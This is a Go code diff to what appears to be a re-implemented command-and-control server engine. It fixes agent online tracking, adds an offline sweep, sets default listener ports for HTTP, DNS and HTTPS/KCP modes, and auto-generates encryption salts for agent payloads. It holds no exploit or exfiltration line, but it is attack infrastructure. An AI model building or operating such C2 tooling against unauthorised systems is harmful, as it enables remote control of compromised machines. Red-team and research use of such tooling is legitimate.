@@ -3,6 +3,7 @@ package c2engine
 import (
 	"fmt"
 	"sort"
+	"strings"
 	"sync"
 	"time"
 )
@@ -156,6 +157,11 @@ func (e *Engine) NewClient(verifyKey, clientType, addr, localIP, userName, hostN
 			refresh(&client.ProcessName, processName)
 			refresh(&client.Arch, arch)
 			client.AddConn()
+			// 重新签到即在线（原版把客户端 +0x50 置真）。此前这里没有任何
+			// 写入点，导致 agent 上线后面板仍判离线、所有派发接口返回
+			// "client is close"。
+			client.SetOnline(true)
+			e.storage.StoreClients(e.clients)
 			return client, nil
 		}
 	}
@@ -174,12 +180,54 @@ func (e *Engine) NewClient(verifyKey, clientType, addr, localIP, userName, hostN
 	if verifyKey != "" {
 		e.vkeyIndex[verifyKey] = client.ID
 	}
+	// 首次签到同样在线。
+	client.SetOnline(true)
 
 	// Persist
 	e.storage.StoreClients(e.clients)
 
 	Logf("New client: %s@%s (ID: %d, OS: %s)", userName, hostName, client.ID, osName)
 	return client, nil
+}
+
+// MarkOffline 把客户端标记为离线（派发路径据此拒绝下发）。
+// MarkOffline marks a client offline; dispatch paths reject offline clients.
+func (e *Engine) MarkOffline(id int64) {
+	e.mu.Lock()
+	defer e.mu.Unlock()
+	if c, ok := e.clients[id]; ok {
+		c.SetOnline(false)
+	}
+}
+
+// SweepOffline 把超过 timeout 未活跃的客户端标记为离线，返回本次下线数量。
+//
+// 原版由后台巡检维护在线位；复刻端的 agent 每条通道都会刷新 LastSeen
+// （HTTP 任务轮询、KCP 结果/心跳、DNS 查询），因此"超过 timeout 没有动静"
+// 即可判定离线。timeout <= 0 时使用 DisconnectTimeout 的默认 60 秒。
+//
+// SweepOffline marks clients whose last activity is older than timeout as offline.
+func (e *Engine) SweepOffline(timeout time.Duration) int {
+	if timeout <= 0 {
+		timeout = 60 * time.Second
+	}
+	cutoff := time.Now().Add(-timeout)
+
+	e.mu.Lock()
+	defer e.mu.Unlock()
+
+	changed := 0
+	for _, c := range e.clients {
+		if !c.IsOnline() {
+			continue
+		}
+		if c.LastSeenAt().Before(cutoff) {
+			c.SetOnline(false)
+			changed++
+			Logf("Client %d marked offline (no activity for %s)", c.ID, timeout)
+		}
+	}
+	return changed
 }
 
 // BlockKey bars agents presenting this verify key from checking in.
@@ -423,10 +471,39 @@ func (e *Engine) IsPubClient(id int64) bool {
 // Listener management
 // ============================================================================
 
+// DefaultListenerAddr 按监听器模式返回默认监听地址。
+//
+// 面板的 /listener/add 只提交 Mode/Vkey/OssUrl/Remark/vip，地址由服务端决定。
+// 复刻端此前一律留空 → C2Listener.Start 回落到 0.0.0.0:443，非 root 直接
+// 启动失败，也无法同时开两个监听器。
+//
+// DefaultListenerAddr returns the default bind address for a listener mode.
+func DefaultListenerAddr(mode string) string {
+	switch strings.ToLower(mode) {
+	case ListenerModeHTTP:
+		return "0.0.0.0:80"
+	case ListenerModeDNS:
+		return "0.0.0.0:53"
+	default: // https / kcp / websocket / cdn_websocket / reverse
+		return "0.0.0.0:443"
+	}
+}
+
 // NewListener creates and stores a new C2 listener
 func (e *Engine) NewListener(listenAddr, connectAddr, mode, verifyKey, encryptSalt, remark string) (*Listener, error) {
 	e.mu.Lock()
 	defer e.mu.Unlock()
+
+	// 加密盐缺省时自动生成：面板只提交 Mode/Vkey，若这里留空，agent 与
+	// 服务端会各自用不同密钥派生消息帧密钥（agent 侧曾写死 "salt"），
+	// 结果是帧解不开。生成后随监听器落库，载荷生成时再注入 agent。
+	if encryptSalt == "" {
+		encryptSalt = GenerateEncryptSalt()
+	}
+	// 监听地址缺省时按协议给默认端口（面板的 Add 只提交 Mode/Vkey）。
+	if listenAddr == "" {
+		listenAddr = DefaultListenerAddr(mode)
+	}
 
 	e.listenerSeq++
 	l := &Listener{
@@ -497,6 +574,28 @@ func (e *Engine) UpdateListener(id int64, updates map[string]interface{}) (*List
 	}
 	if v, ok := updates["encrypt_salt"].(string); ok {
 		l.EncryptSalt = v
+	}
+	if v, ok := updates["oss_url"].(string); ok {
+		l.OssUrl = v
+	}
+	if v, ok := updates["proxy"].(string); ok {
+		l.Proxy = v
+	}
+	if v, ok := updates["vip"].(bool); ok {
+		l.IsVIP = v
+	}
+	if v, ok := updates["ping_interval"].(int); ok && v > 0 {
+		l.PingInterval = v
+	}
+	if v, ok := updates["disconnect_timeout"].(int); ok && v > 0 {
+		l.DisconnectTimeout = v
+	}
+	// Host/Port 是面板表单字段（ListenAddr 缺省时用它们拼地址）。
+	if v, ok := updates["host"].(string); ok {
+		l.Host = v
+	}
+	if v, ok := updates["port"].(int); ok {
+		l.Port = v
 	}
 
 	e.storage.StoreListeners(e.listeners)
